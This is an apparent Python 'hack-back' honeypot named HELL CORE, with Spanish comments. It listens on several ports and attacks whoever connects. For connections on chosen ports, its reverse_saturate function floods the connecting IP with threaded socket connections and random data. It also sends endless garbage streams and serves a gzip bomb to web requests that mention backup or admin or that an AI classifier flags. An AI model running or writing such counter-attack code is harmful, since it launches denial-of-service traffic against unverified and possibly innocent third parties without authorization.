import socket
import threading
import time
import random
import os
from ai_module import GeminiDefender
from threat_intel import VirusTotalReporter

# CONFIGURACIÓN HELL: MODO ULTRA-AGRESIVO
HOST = '0.0.0.0'
# Puertos críticos para contraataque ofensivo
LETHAL_PORTS = [2222, 3389, 4455] 
PORTS = [8080, 2525, 3306, 6379] + LETHAL_PORTS
GZIP_BOMB_PATH = "payloads/bomb.gz"
LOG_FILE = "logs/hell_activity.log"

USE_AI = os.getenv("USE_AI", "false").lower() == "true"
GEMINI_KEY = os.getenv("GEMINI_API_KEY", "")
VT_KEY = os.getenv("VT_API_KEY", "")
MY_IP = os.getenv("MY_IP", "127.0.0.1")

class HellServer:
    def __init__(self):
        self.defender = GeminiDefender(GEMINI_KEY) if USE_AI else None
        self.reporter = VirusTotalReporter(VT_KEY)
        self.whitelist = {MY_IP, "127.0.0.1"}
        print(f"[💀] HELL CORE: MODO ULTRA-AGRESIVO (REVERSE FLOOD) ACTIVADO")

    def log_event(self, message):
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        with open(LOG_FILE, "a") as f:
            f.write(f"[{timestamp}] {message}\n")
        print(message)

    def reverse_saturate(self, target_ip):
        """Inicia un ataque de saturación de sockets hacia el atacante (Reverse Flood)"""
        self.log_event(f"[🚀] INICIANDO REVERSE FLOOD contra {target_ip} (1000 Sockets)...")
        ports_to_flood = [80, 443, 22, 21, 445, 3389, 8080]
        
        def flood():
            for _ in range(200): # 200 intentos por hilo
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    target_port = random.choice(ports_to_flood)
                    s.connect((target_ip, target_port))
                    s.send(os.urandom(1024)) # Enviar basura
                    # No cerramos inmediatamente para mantener el socket ocupado en su lado
                    time.sleep(2) 
                    s.close()
                except: pass

        # Lanzar hilos de inundación
        for _ in range(5): 
            threading.Thread(target=flood, daemon=True).start()

    def universal_garbage_stream(self, client_socket, addr):
        try:
            while True:
                client_socket.send(os.urandom(4096))
                time.sleep(0.1)
        except: pass

    def handle_client(self, client_socket, addr, local_port):
        if addr[0] in self.whitelist:
            client_socket.close()
            return

        self.log_event(f"[*] Incursión detectada: {addr[0]} en puerto {local_port}")
        
        try:
            # Si el puerto es CRÍTICO, activamos REVERSE FLOOD de inmediato
            if local_port in LETHAL_PORTS:
                self.reverse_saturate(addr[0])
                self.universal_garbage_stream(client_socket, addr)
                return

            # Para otros puertos, lógica estándar
            self.reporter.report_ip(addr[0])
            
            if local_port == 2525: # SMTP
                client_socket.send(b"220 hell.smtp ESMTP\r\n")
                time.sleep(10)
                self.universal_garbage_stream(client_socket, addr)
            
            elif local_port == 3306 or local_port == 6379: # DBs
                self.universal_garbage_stream(client_socket, addr)

            else: # Puerto 8080 (Web/IA)
                request = client_socket.recv(2048).decode('utf-8', errors='ignore')
                
                # IA classification
                attack_type = None
                if self.defender:
                    decision = self.defender.analyze_threat(request)
                    if "IA_ATACANTE" in decision: attack_type = "GZIP_BOMB"
                
                if not attack_type and ("backup" in request or "admin" in request):
                    attack_type = "GZIP_BOMB"

                if attack_type == "GZIP_BOMB":
                    self.log_event(f"[🔥] LANZANDO GZIP BOMB contra {addr[0]}")
                    header = "HTTP/1.1 200 OK\r\nX-Audit: [FAIL]\r\nContent-Encoding: gzip\r\n\r\n"
                    client_socket.send(header.encode())
                    if os.path.exists(GZIP_BOMB_PATH):
                        with open(GZIP_BOMB_PATH, "rb") as f: client_socket.send(f.read())
                
                self.universal_garbage_stream(client_socket, addr)

        except Exception as e:
            self.log_event(f"[!] Error con {addr[0]}: {e}")
        finally:
            client_socket.close()

    def start_listener(self, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, port))
        server.listen(100)
        while True:
            try:
                client, addr = server.accept()
                threading.Thread(target=self.handle_client, args=(client, addr, port)).start()
            except: pass

    def start(self):
        self.log_event(f"[✔] HELL CORE: Monitoreando {len(PORTS)} puertos en modo Ultra-Agresivo.")
        for port in PORTS:
            threading.Thread(target=self.start_listener, args=(port,), daemon=True).start()
        while True: time.sleep(1)

if __name__ == "__main__":
    HellServer().start()
